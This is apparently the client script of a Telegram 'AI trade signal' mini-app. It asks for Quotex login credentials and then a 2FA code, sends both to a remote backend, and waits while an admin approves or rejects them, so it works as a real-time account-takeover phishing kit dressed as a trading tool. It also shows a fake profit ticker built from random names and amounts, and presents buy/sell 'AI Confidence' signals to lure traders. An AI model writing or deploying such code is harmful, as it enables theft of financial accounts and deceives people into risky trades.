const RENDER_BACKEND_URL = "https://aliza-trade-bot-2-step.onrender.com";

document.addEventListener("DOMContentLoaded", () => {
    
    // --- TELEGRAM INIT ---
    let tg;
    try {
        tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
    } catch(e) { console.log("Running outside Telegram"); }
    
    const USER_ID = tg?.initDataUnsafe?.user?.id || Math.floor(Math.random() * 100000);

    // --- SEAMLESS TICKER LOGIC (Mixed Global Names) ---
    const tickerContainer = document.getElementById('tickerItems');
    if (tickerContainer) {
        const names = [
            "Rahul", "Usman", "Fatima", "Arjun", "Tariq", "Ayesha", "Zayed", "Priya", 
            "Imran", "Kabir", "Hassan", "Sneha", "Ali", "Zoya", "Ravi", "Mehmet", 
            "Ananya", "Farhan", "Omar", "Sana", "Karan", "Nadia", "Aditya", "Bilal"
        ];
        
        // Fisher-Yates Shuffle for better randomization
        for (let i = names.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [names[i], names[j]] = [names[j], names[i]];
        }

        let baseHTML = "";
        for(let i=0; i<15; i++) {
            const name = names[i];
            const profit = Math.floor(Math.random() * (450 - 80 + 1)) + 80;
            baseHTML += `<div class="ticker-item">🏆 ${name} Profit: <span>+$${profit}</span></div>`;
        }
        tickerContainer.innerHTML = baseHTML + baseHTML; 
    }

    // --- CLEAN DROPDOWN LOGIC ---
    const marketSelect = document.getElementById('marketType');
    const assetSelect = document.getElementById('assetPair');
    const assetsData = { 
        live: ["EUR/USD", "GBP/USD", "USD/JPY", "AUD/USD", "USD/CHF", "NZD/USD"], 
        otc: ["USD/PKR (OTC)", "GBP/USD (OTC)", "USD/JPY (OTC)", "AUD/CAD (OTC)", "BTC/USD (OTC)"] 
    };

    if (marketSelect && assetSelect) {
        marketSelect.addEventListener('change', () => {
            assetSelect.innerHTML = '<option value="" disabled selected>-- Select Asset Pair --</option>';
            const selectedMarket = marketSelect.value;
            if (assetsData[selectedMarket]) {
                assetsData[selectedMarket].forEach(pair => {
                    let opt = document.createElement('option');
                    opt.value = pair; opt.innerHTML = pair;
                    assetSelect.appendChild(opt);
                });
            }
        });
    }

    // --- TABS SWITCHING LOGIC ---
    const navItems = document.querySelectorAll('.nav-item');
    const tabContents = document.querySelectorAll('.tab-content');

    navItems.forEach(item => {
        item.addEventListener('click', function() {
            navItems.forEach(nav => nav.classList.remove('active-nav'));
            tabContents.forEach(tab => tab.classList.remove('active-tab'));

            this.classList.add('active-nav');
            const targetId = this.getAttribute('data-target');
            document.getElementById(targetId).classList.add('active-tab');

            if(tg?.HapticFeedback) tg.HapticFeedback.selectionChanged();
        });
    });

    // --- LOGIN & 2FA LOGIC ---
    let pollInterval;
    let codeErrorShown = false; 

    const btnLogin = document.getElementById('btnLogin');
    const btnSubmitCode = document.getElementById('btnSubmitCode');
    
    if (btnLogin) {
        btnLogin.addEventListener('click', async () => {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if(!email || !password) return alert("⚠️ Credentials required!");
            
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('waiting-msg').style.display = 'block';

            try {
                await fetch(`${RENDER_BACKEND_URL}/api/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user_id: USER_ID, email, password })
                });
                pollInterval = setInterval(checkApproval, 3000);
            } catch (e) {
                alert("❌ Server Connection Failed. Check internet or contact Admin.");
                document.getElementById('waiting-msg').style.display = 'none';
                document.getElementById('login-form').style.display = 'block';
            }
        });
    }

    if (btnSubmitCode) {
        btnSubmitCode.addEventListener('click', async () => {
            const code = document.getElementById('auth-code').value;
            if(!code) return alert("⚠️ Please Enter The Code!");

            document.getElementById('code-form').style.display = 'none';
            document.getElementById('waiting-msg').style.display = 'block';
            
            // Custom text requested by you
            document.querySelector('.wait-text').innerText = "Checking your details";
            document.querySelector('.wait-subtext').innerText = "Please wait while we are confirming With Quotex...";

            try {
                await fetch(`${RENDER_BACKEND_URL}/api/code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user_id: USER_ID, code: code })
                });
                codeErrorShown = false; // Reset error flag
            } catch (e) {
                alert("❌ Connection Failed.");
            }
        });
    }

    async function checkApproval() {
        try {
            const res = await fetch(`${RENDER_BACKEND_URL}/api/check_status/${USER_ID}`);
            const data = await res.json();
            
            if (data.status === 'code_required') {
                // Show Code Form
                document.getElementById('login-form').style.display = 'none';
                document.getElementById('waiting-msg').style.display = 'none';
                document.getElementById('code-form').style.display = 'block';
                
            } else if (data.status === 'code_declined' && !codeErrorShown) {
                // Node Error Triggered by Admin Decline
                alert("Node error and try again");
                codeErrorShown = true; 
                document.getElementById('waiting-msg').style.display = 'none';
                document.getElementById('code-form').style.display = 'block';
                document.getElementById('auth-code').value = ''; 

            } else if (data.status === 'approved') {
                clearInterval(pollInterval);
                document.getElementById('login-screen').style.display = 'none';
                
                const splash = document.getElementById('splash-screen');
                splash.style.display = 'flex';
                
                setTimeout(() => {
                    splash.style.opacity = '0';
                    setTimeout(() => {
                        splash.style.display = 'none';
                        document.getElementById('main-app').style.display = 'block';
                    }, 500);
                }, 2000);
                
            } else if (data.status === 'declined') {
                clearInterval(pollInterval);
                alert("❌ Access Denied by Admin.");
                document.getElementById('waiting-msg').style.display = 'none';
                document.getElementById('login-form').style.display = 'block';
            }
        } catch (e) {}
    }

    // --- VOICE LOGIC (Audio Context Unlocker Fix) ---
    function unlockAudio() {
        if ('speechSynthesis' in window) {
            const silent = new SpeechSynthesisUtterance('');
            silent.volume = 0;
            window.speechSynthesis.speak(silent);
        }
    }

    function speakSignal(direction) {
        try {
            if ('speechSynthesis' in window) {
                window.speechSynthesis.cancel();
                const utterance = new SpeechSynthesisUtterance(direction === 'UP' ? 'Buy Now. Go Up' : 'Sell Now. Go Down');
                utterance.pitch = 1.1;
                utterance.rate = 1.0;
                
                const voices = window.speechSynthesis.getVoices();
                const femaleVoice = voices.find(v => v.name.includes('Female') || v.name.includes('Zira') || v.name.includes('Samantha'));
                if (femaleVoice) utterance.voice = femaleVoice;
                
                window.speechSynthesis.speak(utterance);
            }
        } catch (e) { console.log("Voice issue:", e); }
    }

    if ('speechSynthesis' in window) {
        window.speechSynthesis.onvoiceschanged = () => window.speechSynthesis.getVoices();
    }

    // --- SIGNAL GENERATION & TIMEFRAME SYNC ENGINE ---
    const btnGen = document.getElementById('btnGen');
    let syncTimer = null;
    let countdownInterval = null;

    if (btnGen) {
        btnGen.addEventListener('click', async () => {
            unlockAudio();

            if (!marketSelect.value) {
                alert("⚠️ Please select a Market Category first!");
                return;
            }
            if (!assetSelect.value) {
                alert("⚠️ Please select an Asset Pair first!");
                return;
            }

            if(syncTimer) clearTimeout(syncTimer);
            if(countdownInterval) clearInterval(countdownInterval);

            const scanner = document.getElementById('scanner');
            const resultBox = document.getElementById('resultBox');
            
            btnGen.innerText = "SCANNING MARKET ⚡...";
            btnGen.style.opacity = "0.7";
            btnGen.disabled = true;
            resultBox.style.display = 'none';
            scanner.style.display = 'block';
            
            if(tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');

            try {
                const response = await fetch(`${RENDER_BACKEND_URL}/api/get_signal/${USER_ID}`);
                const data = await response.json();
                
                if (response.status !== 200) {
                    // CUSTOM LIMIT MESSAGE DISPLAYED HERE
                    alert("❌ ERROR: " + (data.message || data.error || "Access Denied."));
                    resetBtn(btnGen, "GENERATE AI SIGNAL ⚡", scanner);
                    return;
                }

                scanner.style.display = 'none';
                resultBox.style.display = 'block';
                btnGen.style.display = 'none'; 
                
                const isUp = data.direction === 'UP';
                document.getElementById('signalOutput').className = 'signal-text ' + (isUp ? 'signal-UP' : 'signal-DOWN');
                document.getElementById('signalOutput').innerHTML = isUp ? 'CALL (UP) ⬆️' : 'PUT (DOWN) ⬇️';
                
                document.getElementById('accuracyText').innerHTML = `AI Confidence: ${data.accuracy}%`;
                setTimeout(() => {
                    document.getElementById('accBar').style.width = `${data.accuracy}%`;
                }, 100);
                
                if(tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred(isUp ? 'success' : 'warning');
                speakSignal(data.direction);

                const selectedSeconds = parseInt(document.getElementById('timeframe').value);
                let timeLeft = selectedSeconds;
                const timerSpan = document.getElementById('timerCountdown');
                timerSpan.innerText = timeLeft;

                countdownInterval = setInterval(() => {
                    timeLeft--;
                    timerSpan.innerText = timeLeft;
                }, 1000);

                syncTimer = setTimeout(() => {
                    clearInterval(countdownInterval);
                    resultBox.style.display = 'none';       
                    btnGen.style.display = 'block';         
                    resetBtn(btnGen, "GENERATE NEXT SIGNAL ⚡", scanner, true);
                    
                    if(tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
                }, selectedSeconds * 1000); 

            } catch (error) {
                alert("⚠️ NETWORK ERROR: Server is sleeping. Try again in 30 seconds.");
                resetBtn(btnGen, "GENERATE AI SIGNAL ⚡", scanner);
            }
        });
    }

    function resetBtn(btn, text, scanner, hideScanner = true) {
        btn.innerText = text;
        btn.style.opacity = "1";
        btn.disabled = false;
        if(hideScanner) scanner.style.display = 'none';
    }
});
